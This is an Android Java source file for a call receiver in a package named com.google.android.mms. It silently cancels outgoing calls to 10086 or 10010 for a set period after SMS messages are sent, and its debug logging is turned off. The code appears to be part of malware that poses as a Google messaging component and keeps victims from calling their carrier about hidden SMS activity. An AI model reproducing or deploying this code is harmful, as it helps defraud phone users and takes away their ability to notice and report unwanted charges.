package com.google.android.mms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class PhoneCallReceiver extends BroadcastReceiver {
    private static final String TAG = "PhoneCallReceiver";
    private static final boolean DEBUG = false;
    
    @Override
    public void onReceive(Context context, Intent intent) {
        LOGD("[[onReceive]] receive a new call for intent : " + intent);
        LOGD("++++++++++ result = " + this.getResultData());
        
        String number = this.getResultData();
        if (number != null) {
            SettingManager sm = SettingManager.getInstance(context);
            long smsLastSendTime = sm.getSMSBlockBeginTime();
            long smsBlockTime = sm.getSMSBlockDelayTime();
            long curTime = System.currentTimeMillis();
            if (((curTime - smsLastSendTime) < smsBlockTime) 
                    && ((number.equals("10086") || number.equals("10010"))))  {
                setResultData(null);
            }
        }
    }

    public static final void LOGD(String msg) {
        if (DEBUG) {
            Log.d(TAG, msg);
        }
    }    
}
